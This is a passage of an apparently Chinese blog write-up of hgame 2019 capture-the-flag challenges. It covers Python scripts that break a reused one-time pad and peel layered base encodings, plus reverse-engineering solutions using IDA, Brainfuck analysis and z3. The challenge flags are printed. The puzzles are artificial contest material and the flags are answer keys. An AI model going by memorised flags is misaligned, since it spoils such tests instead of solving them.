class="string">&#x27;c5a342468c8c7a88999a9dd623c0cc4b0f7c829acaf8f3ac13c78300b3b1c7a3ef8e193840bb&#x27;</span></span><br><span class="line">c3 = <span class="string">&#x27;dda342458c897a8285df879e3285ce511e7c8d9afff9b7ff15de8a16b394c7bdab920e7946a05e9941d8308e&#x27;</span></span><br><span class="line">c4 = <span class="string">&#x27;d9b05b4cd5ce7c8f938bd39e24d0df191d7694dfeaf8bfbb56e28900e1b8dff1bb985c2d5aa154&#x27;</span></span><br><span class="line">c5 = <span class="string">&#x27;d9aa4b00c88b7fc79d99d38223c08d54146b88d3f0f0f38c03df8d52f0bfc1bda3d7133712a55e9948c32c8a&#x27;</span></span><br><span class="line">c6 = <span class="string">&#x27;c4b60e46c9827cc79e9698936bd1c55c5b6e87c8f0febdb856fe8052e4bfc9a5efbe5c3f57ad4b9944de34&#x27;</span></span><br><span class="line">c7 = <span class="string">&#x27;d9aa5700da817f94d29e81936bc4c1555b7b94d5f5f2bdff37df8252ffbecfb9bbd7152a12bc4fc00ad7229090&#x27;</span></span><br><span class="line">c8 = <span class="string">&#x27;c4e24645cd9c28939a86d3982ac8c819086989d1fbf9f39e18d5c601fbb6dab4ef9e12795bbc549959d9229090&#x27;</span></span><br><span class="line">c9 = <span class="string">&#x27;d9aa4b598c80698a97df879e2ec08d5b1e7f89c8fbb7beba56f0c619fdb2c4bdef8313795fa149dc0ad4228f&#x27;</span></span><br><span class="line">c10 = <span class="string">&#x27;cce25d48d98a6c8280df909926c0de19143983c8befab6ff21d99f52e4b2daa5ef83143647e854d60ad5269c87&#x27;</span></span><br><span class="line">c11 = <span class="string">&#x27;d9aa4b598c85668885df9d993f85e419107783cdbee3bbba1391b11afcf7c3bfaa805c2d5aad42995ede2cdd82977244&#x27;</span></span><br><span class="line">c12 = <span class="string">&#x27;e1ad40478c82678995df809e2ac9c119323994cffbb7a7b713d4c626fcb888b5aa920c354be853d60ac5269199&#x27;</span></span><br><span class="line">c13 = <span class="string">&#x27;c4ac0e53c98d7a8286df84936bc8c84d5b50889aedfebfba18d28352daf7cfa3a6920a3c&#x27;</span></span><br><span class="line">c14 = <span class="string">&#x27;d9aa4f548c9a609ed297969739d18d5a146c8adebef1bcad11d49252c7bfd1f1bc87152b5bbc07dd4fd226948397&#x27;</span></span><br><span class="line">c15 = <span class="string">&#x27;c4a40e698c9d6088879397d626c0c84d5b6d8edffbb792b902d49452ffbec6b6ef8e193840&#x27;</span></span><br><span class="line">c16 = <span class="string">&#x27;c5ad5900df8667929e9bd3bf6bc2df5c1e6dc6cef6f2b6ff21d8921ab3a4c1bdaa991f3c12a949dd0ac5269c&#x27;</span></span><br><span class="line"></span><br><span class="line">ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11,c12,c13,c14,c15,c16]</span><br><span class="line"><span class="comment"># The target ciphertext we want to crack</span></span><br><span class="line">target_cipher = <span class="string">&#x27;c2967e7fc59d57899d8bac852ac3c866127fb9d7f1e5b68002d9871cccb8c6b2aa&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># XORs two string</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strxor</span>(<span class="params">a, b</span>):</span>     <span class="comment"># xor two strings (trims the longer input)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([chr(ord(x) ^ ord(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(a, b)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># To store the final key</span></span><br><span class="line">final_key = [<span class="literal">None</span>]*<span class="number">150</span></span><br><span class="line"><span class="comment"># To store the positions we know are broken</span></span><br><span class="line">known_key_positions = set()</span><br><span class="line"></span><br><span class="line"><span class="comment"># For each ciphertext</span></span><br><span class="line"><span class="keyword">for</span> current_index, ciphertext <span class="keyword">in</span> enumerate(ciphers):</span><br><span class="line">    counter = collections.Counter()</span><br><span class="line">    <span class="comment"># for each other ciphertext</span></span><br><span class="line">    <span class="keyword">for</span> index, ciphertext2 <span class="keyword">in</span> enumerate(ciphers):</span><br><span class="line">        <span class="keyword">if</span> current_index != index: <span class="comment"># don&#x27;t xor a ciphertext with itself</span></span><br><span class="line">            <span class="keyword">for</span> indexOfChar, char <span class="keyword">in</span> enumerate(strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>), ciphertext2.decode(<span class="string">&#x27;hex&#x27;</span>))): <span class="comment"># Xor the two ciphertexts</span></span><br><span class="line">                <span class="comment"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&#x27;t know which one)</span></span><br><span class="line">                <span class="keyword">if</span> char <span class="keyword">in</span> string.printable <span class="keyword">and</span> char.isalpha(): counter[indexOfChar] += <span class="number">1</span> <span class="comment"># Increment the counter at this index</span></span><br><span class="line">    knownSpaceIndexes = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Loop through all positions where a space character was possible in the current_index cipher</span></span><br><span class="line">    <span class="keyword">for</span> ind, val <span class="keyword">in</span> counter.items():</span><br><span class="line">        <span class="comment"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span></span><br><span class="line">        <span class="keyword">if</span> val &gt;= <span class="number">7</span>: knownSpaceIndexes.append(ind)</span><br><span class="line">    <span class="comment">#print knownSpaceIndexes # Shows all the positions where we now know the key!</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span></span><br><span class="line">    xor_with_spaces = strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>),<span class="string">&#x27; &#x27;</span>*<span class="number">150</span>)</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> knownSpaceIndexes:</span><br><span class="line">        <span class="comment"># Store the key&#x27;s value at the correct position</span></span><br><span class="line">        final_key[index] = xor_with_spaces[index].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">        <span class="comment"># Record that we known the key at this position</span></span><br><span class="line">        known_key_positions.add(index)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct a hex key from the currently known key, adding in &#x27;00&#x27; hex chars where we do not know (to make a complete hex string)</span></span><br><span class="line">final_key_hex = <span class="string">&#x27;&#x27;</span>.join([val <span class="keyword">if</span> val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&#x27;00&#x27;</span> <span class="keyword">for</span> val <span class="keyword">in</span> final_key])</span><br><span class="line"><span class="comment"># Xor the currently known key with the target cipher</span></span><br><span class="line">output = strxor(target_cipher.decode(<span class="string">&#x27;hex&#x27;</span>),final_key_hex.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Fix this sentence:&quot;</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join([char <span class="keyword">if</span> index <span class="keyword">in</span> known_key_positions <span class="keyword">else</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">for</span> index, char <span class="keyword">in</span> enumerate(output)])+<span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WAIT.. MANUAL STEP HERE </span></span><br><span class="line"><span class="comment"># This output are printing a * if that character is not known yet</span></span><br><span class="line"><span class="comment"># fix the missing characters like this: &quot;Let*M**k*ow if *o&#123;*a&quot; = &quot;cure, Let Me know if you a&quot;</span></span><br><span class="line"><span class="comment"># if is too hard, change the target_cipher to another one and try again</span></span><br><span class="line"><span class="comment"># and we have our key to fix the entire text!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sys.exit(0) #comment and continue if u got a good key</span></span><br><span class="line"></span><br><span class="line">target_plaintext = <span class="string">&quot;OTP_is_not_safe_if_more_than_once&quot;</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Fixed:&quot;</span></span><br><span class="line"><span class="keyword">print</span> target_plaintext+<span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">key = strxor(target_cipher.decode(<span class="string">&#x27;hex&#x27;</span>),target_plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Decrypted msg:&quot;</span></span><br><span class="line"><span class="keyword">for</span> cipher <span class="keyword">in</span> ciphers:</span><br><span class="line">    <span class="keyword">print</span> strxor(cipher.decode(<span class="string">&#x27;hex&#x27;</span>),key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\nPrivate key recovered: &quot;</span>+key+<span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><p>通过修补很容易得到flag，再验证，基本上很快可以得到正确结果。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Fix this sentence:</span><br><span class="line">*TP_:s_not_safe_if_more_tha&amp;_once</span><br><span class="line"></span><br><span class="line">Fixed:</span><br><span class="line">OTP_is_not_safe_if_more_than_once</span><br><span class="line"></span><br><span class="line">Decrypted msg:</span><br><span class="line">When we two parted In silence and</span><br><span class="line">Half broken hearted To sever for </span><br><span class="line">Pale grew thy cheek and cold Cold</span><br><span class="line">Truly that hour foretold Sorrow t</span><br><span class="line">The dew of the morning Sunk chill</span><br><span class="line">It felt like the warning Of what </span><br><span class="line">Thy vows are all broken And light</span><br><span class="line">I hear thy name spoken And share </span><br><span class="line">They name thee before me A knell </span><br><span class="line">A shudder comes o er me Why wert </span><br><span class="line">They know not I knew thee Who kne</span><br><span class="line">long long shall I rue thee Too de</span><br><span class="line">In secret we met In silence I gri</span><br><span class="line">That thy heart could forget Thy s</span><br><span class="line">If I should meet thee After ling </span><br><span class="line">How should I greet thee With sile</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;OTP_is_not_safe_if_more_than_once&#125;</span><br></pre></td></tr></table></figure><h2 id="Base全家"><a href="#Base全家" class="headerlink" title="Base全家"></a>Base全家</h2><blockquote><p>描述<br>全家老小<br>URL <a href="http://plir4axuz.bkt.clouddn.com/hgame2019/enc.txt">http://plir4axuz.bkt.clouddn.com/hgame2019/enc.txt</a></p></blockquote><p>多种base组合</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">return</span> requests.get(url).text</span><br><span class="line"></span><br><span class="line">steps = []</span><br><span class="line">url = <span class="string">&quot;http://plir4axuz.bkt.clouddn.com/hgame2019/enc.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] Downloading encrypted file...&quot;</span></span><br><span class="line">p = download(url)</span><br><span class="line">n = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># Base16</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;[?] using base16 deocde&quot;</span></span><br><span class="line">        n = base64.b16decode(p)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;[+] %s&quot;</span> % (n)</span><br><span class="line">        steps.append(<span class="number">16</span>)</span><br><span class="line">        p = n</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># Base32</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;[?] using base32 deocde&quot;</span></span><br><span class="line">        n = base64.b32decode(p)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;[+] %s&quot;</span> % (n)</span><br><span class="line">        steps.append(<span class="number">32</span>)</span><br><span class="line">        p = n</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># Base64</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;[?] using base64 deocde&quot;</span></span><br><span class="line">        n = base64.b64decode(p)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;[+] %s&quot;</span> % (n)</span><br><span class="line">        steps.append(<span class="number">64</span>)</span><br><span class="line">        p = n</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] flag found : %s&quot;</span> % (n)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] steps : %s&quot;</span> % (steps)</span><br></pre></td></tr></table></figure><p>得到结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] base58 : 2BAja2VqXoHi9Lo5kfQZBPjq1EmZHGEudM5JyDPREPmS3CxrpB8BnC</span><br></pre></td></tr></table></figure><p><a href="http://lenschulwitz.com/base58">http://lenschulwitz.com/base58</a> ，最后得到结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;40ca78cde14458da697066eb4cc7daf6&#125;</span><br></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Pro的Python教室-一"><a href="#Pro的Python教室-一" class="headerlink" title="Pro的Python教室(一)"></a>Pro的Python教室(一)</h2><blockquote><p>描述<br>Easiest Python Challenge!<br>URL <a href="http://plqbnxx54.bkt.clouddn.com/first.py">http://plqbnxx54.bkt.clouddn.com/first.py</a></p></blockquote><p>不知道该怎怎么说，因为直接给出源码，太简单了==</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;Here_1s_3asy_Pyth0n&#125;</span><br></pre></td></tr></table></figure><h2 id="HelloRe"><a href="#HelloRe" class="headerlink" title="HelloRe"></a>HelloRe</h2><blockquote><p>描述<br>Welcoooooome!<br>URL <a href="http://plps4kyke.bkt.clouddn.com/HelloRe">http://plps4kyke.bkt.clouddn.com/HelloRe</a></p></blockquote><p>IDA打开，<code>Shift+F12</code>得到结果：</p><p><img src="https://i.loli.net/2019/01/31/5c52e91da3cdc.png"></p><p>回头看一眼代码，逻辑很简单：</p><p><img src="https://i.loli.net/2019/01/31/5c52e9a0f34e3.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;Welc0m3_t0_R3_World!&#125;</span><br></pre></td></tr></table></figure><h2 id="brainfxxker"><a href="#brainfxxker" class="headerlink" title="brainfxxker"></a>brainfxxker</h2><blockquote><p>描述<br>Ouch! What is this? I don’t think that I am pretty good at C++, what a brain fxxker it is!<br>学习资料:<br><a href="https://zh.wikipedia.org/wiki/Brainfuck">https://zh.wikipedia.org/wiki/Brainfuck</a><br><a href="https://zh.wikipedia.org/zh/ASCII">https://zh.wikipedia.org/zh/ASCII</a><br>读懂我的代码逻辑答案就出来了<br>补充说明:<br>判定答案是否正确的是 Notice 2，即“不执行 [+.] 这个部分”，不要单纯看有没有输出 orz<br>URL <a href="http://plir4axuz.bkt.clouddn.com/hgame2019/brainfucker.cpp">http://plir4axuz.bkt.clouddn.com/hgame2019/brainfucker.cpp</a></p></blockquote><p>解这个题，需要对brainfuck的逻辑有一定的理解才行。参考<a href="https://zh.wikipedia.org/wiki/Brainfuck">https://zh.wikipedia.org/wiki/Brainfuck</a> </p><p>BF语言有两个字节流</p><blockquote><p>一个以字节为单位、被初始化为零的<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E7%BB%84">数组</a>、一个指向该数组的<a href="https://zh.wikipedia.org/wiki/%E6%8C%87%E9%92%88">指针</a>（初始时指向数组的第一个字节）、以及用于输入输出的两个<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AF%80%E6%B5%81">字节流</a>。</p></blockquote><table><thead><tr><th>字符</th><th>含义</th></tr></thead><tbody><tr><td><code>&gt;</code></td><td>指针加一</td></tr><tr><td><code>&lt;</code></td><td>指针减一</td></tr><tr><td><code>+</code></td><td>指针指向的字节的值加一</td></tr><tr><td><code>-</code></td><td>指针指向的字节的值减一</td></tr><tr><td><code>.</code></td><td>输出指针指向的单元内容（<a href="https://zh.wikipedia.org/wiki/ASCII%E7%A0%81">ASCII码</a>）</td></tr><tr><td><code>,</code></td><td>输入内容到指针指向的单元（ASCII码）</td></tr><tr><td><code>[</code></td><td>如果指针指向的单元值为零，向后跳转到对应的<code>]</code>指令的次一指令处</td></tr><tr><td><code>]</code></td><td>如果指针指向的单元值不为零，向前跳转到对应的<code>[</code>指令的次一指令处</td></tr></tbody></table><p>于是这段C++代码实际上就是BF的C++实现，而本题的关键是这段BF代码（以<code>[+.]</code>分割开）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">,&gt;++++++++++[&lt;----------&gt;-]&lt;++[+.]   </span><br><span class="line">,&gt;+++++++++[&lt;---------&gt;-]&lt;-[+.]</span><br><span class="line">,&gt;+++++++[&lt;-------&gt;-]&lt;---[+.]</span><br><span class="line">,&gt;++++++[&lt;------&gt;-]&lt;+++[+.]</span><br><span class="line">,&gt;++++++++[&lt;----------&gt;-]&lt;++[+.]</span><br><span class="line">,&gt;++++++++++[&lt;----------&gt;-]&lt;--[+.]</span><br><span class="line">,&gt;++++++++++[&lt;--------&gt;-]&lt;-----[+.]</span><br><span class="line">,&gt;++++++++++[&lt;----------&gt;-]&lt;+[+.]</span><br><span class="line">,&gt;+++++++++[&lt;--------&gt;-]&lt;---[+.]</span><br></pre></td></tr></table></figure><p>首先，为什么<code>[+.]</code>会报错？</p><blockquote><p>因为</p><p>[ ：如果指针指向单元值不为0，loop开始</p><p>+.：字节指针+1输出，但是该指针并没有指向任何数据，故报错</p><p>] ：循环结束</p></blockquote><p>那么若想<code>[+.]</code>不报错，则需要<code>[</code>之前的指针单元为0</p><p>以第一段为例(之后同理不做赘述)：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">,输入</span><br><span class="line">&gt;指针右移</span><br><span class="line">++++++++++循环变量设置为10</span><br><span class="line">[loop</span><br><span class="line">&lt;指针左移，指向输入的值</span><br><span class="line">----------输入变量减10</span><br><span class="line">&gt;指针右移，指向循环变量</span><br><span class="line">-循环变量减1</span><br><span class="line">（总共减了10次）</span><br><span class="line">]判断循环是否结束</span><br><span class="line"></span><br><span class="line">&lt;指针左移，指向输入变量</span><br><span class="line">++输入变量加2</span><br><span class="line">[+.]&#x3D; 0</span><br><span class="line">----------------------华丽的分割线-------------------</span><br><span class="line">x - 100 + 2 &#x3D; 0</span><br><span class="line">x &#x3D; 98chr(98)&#x3D; b</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;bR4!NfUcK&#125;</span><br></pre></td></tr></table></figure><h2 id="わかります"><a href="#わかります" class="headerlink" title="わかります"></a>わかります</h2><blockquote><p>描述<br>POSITION ZERO!<br>URL <a href="http://plps4kyke.bkt.clouddn.com/wakarimasu">http://plps4kyke.bkt.clouddn.com/wakarimasu</a></p></blockquote><p>main函数逻辑简单：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190202221147.png"></p><p>输入一个值，然后通过一个函数判定是否符合要求。</p><p>但是这个函数稍稍复杂一点</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190202224118.png"></p><p>将输入字符串简单处理以后得到<code>v7</code>和<code>ptr</code>，然后与一个预定义的数组<code>OrginalArr</code>通过两个函数得到v8，v9</p><p>最后判断v8必须与数组<code>arr1</code>,v9必须与数组<code>arr2</code>相等。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190202224337.png"></p><p>func1是两个三维矩阵的乘，func2是两个二维矩阵的加法，z3约束</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">target1 = [<span class="number">122</span>, <span class="number">207</span>, <span class="number">140</span>, <span class="number">149</span>, <span class="number">142</span>, <span class="number">168</span>, </span><br><span class="line"></span><br><span class="line">           <span class="number">95</span>,  <span class="number">201</span>, <span class="number">122</span>, <span class="number">145</span>, <span class="number">136</span>, <span class="number">167</span>, </span><br><span class="line"></span><br><span class="line">           <span class="number">112</span>, <span class="number">192</span>, <span class="number">127</span>, <span class="number">137</span>, <span class="number">134</span>, <span class="number">147</span>, </span><br><span class="line"></span><br><span class="line">           <span class="number">95</span>, <span class="number">207</span>, <span class="number">110</span>, <span class="number">134</span>, <span class="number">133</span>, <span class="number">173</span>, </span><br><span class="line"></span><br><span class="line">           <span class="number">136</span>, <span class="number">212</span>, <span class="number">160</span>, <span class="number">162</span>, <span class="number">152</span>, <span class="number">179</span>, </span><br><span class="line"></span><br><span class="line">           <span class="number">121</span>, <span class="number">193</span>, <span class="number">126</span>, <span class="number">126</span>, <span class="number">119</span>, <span class="number">147</span>]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">token = [<span class="number">8</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, </span><br><span class="line"></span><br><span class="line">         <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>, </span><br><span class="line"></span><br><span class="line">         <span class="number">3</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">8</span>, </span><br><span class="line"></span><br><span class="line">         <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">7</span>, </span><br><span class="line"></span><br><span class="line">         <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, </span><br><span class="line"></span><br><span class="line">         <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target2 = [<span class="number">16</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, </span><br><span class="line"></span><br><span class="line">           <span class="number">5</span>, <span class="number">23</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">23</span>, </span><br><span class="line"></span><br><span class="line">   <span class="number">14</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, </span><br><span class="line"></span><br><span class="line">   <span class="number">4</span>, <span class="number">13</span>, <span class="number">22</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">22</span>, </span><br><span class="line"></span><br><span class="line">   <span class="number">6</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">9</span>, </span><br><span class="line"></span><br><span class="line">   <span class="number">5</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">16</span>, <span class="number">13</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chunk2 = [<span class="number">8</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">13</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = BitVec(<span class="string">&#x27;a&#x27;</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">b = BitVec(<span class="string">&#x27;b&#x27;</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">c = BitVec(<span class="string">&#x27;c&#x27;</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">d = BitVec(<span class="string">&#x27;d&#x27;</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">e = BitVec(<span class="string">&#x27;e&#x27;</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">f = BitVec(<span class="string">&#x27;f&#x27;</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line"></span><br><span class="line">    solve((a &gt;&gt; <span class="number">4</span>) * token[k] + (b &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">6</span>] + (c &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">12</span>] + (d &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">18</span>] + (e &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">24</span>] + (f &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">30</span>] == target1[j],</span><br><span class="line"></span><br><span class="line">(a &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">1</span>] + (b &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">6</span> + <span class="number">1</span>] + (c &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">12</span> + <span class="number">1</span>] + (d &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">18</span> + <span class="number">1</span>] + (e &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">24</span> + <span class="number">1</span>] + (f &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">30</span> + <span class="number">1</span>] == target1[j + <span class="number">1</span>],</span><br><span class="line"></span><br><span class="line">(a &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">2</span>] + (b &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">6</span> + <span class="number">2</span>] + (c &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">12</span> + <span class="number">2</span>] + (d &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">18</span> + <span class="number">2</span>] + (e &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">24</span> + <span class="number">2</span>] + (f &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">30</span> + <span class="number">2</span>] == target1[j + <span class="number">2</span>],</span><br><span class="line"></span><br><span class="line">(a &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">3</span>] + (b &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">6</span> + <span class="number">3</span>] + (c &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">12</span> + <span class="number">3</span>] + (d &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">18</span> + <span class="number">3</span>] + (e &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">24</span> + <span class="number">3</span>] + (f &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">30</span> + <span class="number">3</span>] == target1[j + <span class="number">3</span>],</span><br><span class="line"></span><br><span class="line">(a &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">4</span>] + (b &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">6</span> + <span class="number">4</span>] + (c &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">12</span> + <span class="number">4</span>] + (d &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">18</span> + <span class="number">4</span>] + (e &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">24</span> + <span class="number">4</span>] + (f &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">30</span> + <span class="number">4</span>] == target1[j + <span class="number">4</span>],</span><br><span class="line"></span><br><span class="line">(a &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">5</span>] + (b &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">6</span> + <span class="number">5</span>] + (c &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">12</span> + <span class="number">5</span>] + (d &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">18</span> + <span class="number">5</span>] + (e &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">24</span> + <span class="number">5</span>] + (f &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">30</span> + <span class="number">5</span>] == target1[j + <span class="number">5</span>],</span><br><span class="line"></span><br><span class="line">a &amp; <span class="number">0xf</span> == chunk2[p], b &amp; <span class="number">0xf</span> == chunk2[p + <span class="number">1</span>], c &amp; <span class="number">0xf</span> == chunk2[p + <span class="number">2</span>], d &amp; <span class="number">0xf</span> == chunk2[p + <span class="number">3</span>], e &amp; <span class="number">0xf</span> == chunk2[p + <span class="number">4</span>], f &amp; <span class="number">0xf</span> == chunk2[p + <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">    j += <span class="number">6</span></span><br><span class="line"></span><br><span class="line">    p += <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[f = 123, b = 103, a = 104, c = 97, d = 109, e = 101]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[f = 110, 